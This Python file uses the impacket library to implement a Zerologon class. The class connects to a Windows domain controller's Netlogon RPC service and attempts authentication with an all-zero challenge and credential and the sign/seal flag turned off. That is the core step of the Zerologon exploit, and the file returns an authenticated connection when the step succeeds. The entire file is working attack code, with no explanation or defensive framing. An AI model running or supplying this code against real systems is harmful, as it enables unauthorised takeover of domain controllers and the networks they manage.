#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
import logging


class ZeroLogon():
  '''Zerologon base class '''

  def __init__(self, ipaddress, hostname):
    ''' Init arg(s) ipaddress:str, hostname:str '''
    self.ipaddress = ipaddress
    self.hostname = hostname
    self.host_handle = '\\\\' + hostname


  def run(self):
    ''' Launch a Netlogon authentication attempt against the target.'''

    try:
      # Connect to netlogon service.
      binding = epm.hept_map(self.ipaddress, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
      rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
      rpc_con.connect()
      rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
      # Use an all-zero challenge and credential.
      plaintext = b'\x00' * 8
      ciphertext = b'\x00' * 8
      # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
      flags = 0x212fffff
      # Send challenge and authentication request.
      nrpc.hNetrServerReqChallenge(rpc_con, self.host_handle + '\x00', self.hostname + '\x00', plaintext)
    except nrpc.DCERPCException as e:
      pass
      logging.debug(f'DEV{e}')

    try:
      server_auth = nrpc.hNetrServerAuthenticate3(
        rpc_con, self.host_handle + '\x00', self.hostname + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
        self.hostname + '\x00', ciphertext, flags)

    except nrpc.DCERPCSessionError as e:
      # Debug print -  RPC response code.
      logging.debug(f'{e}')
      
      # RPC response code: NRPC SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED.
      if e.get_error_code() == 0xc0000022:
        return 0xc0000022
      else:
        # Debug print -  RPC response code.
        logging.debug(f'{e}')
        logging.debug(f'Unexpected error code: {e.get_error_code()}')
    
    except BaseException as e:
      logging.debug(f'BaseException: {e}')
    
    else:
      assert server_auth['ErrorCode'] == 0
      
      return rpc_con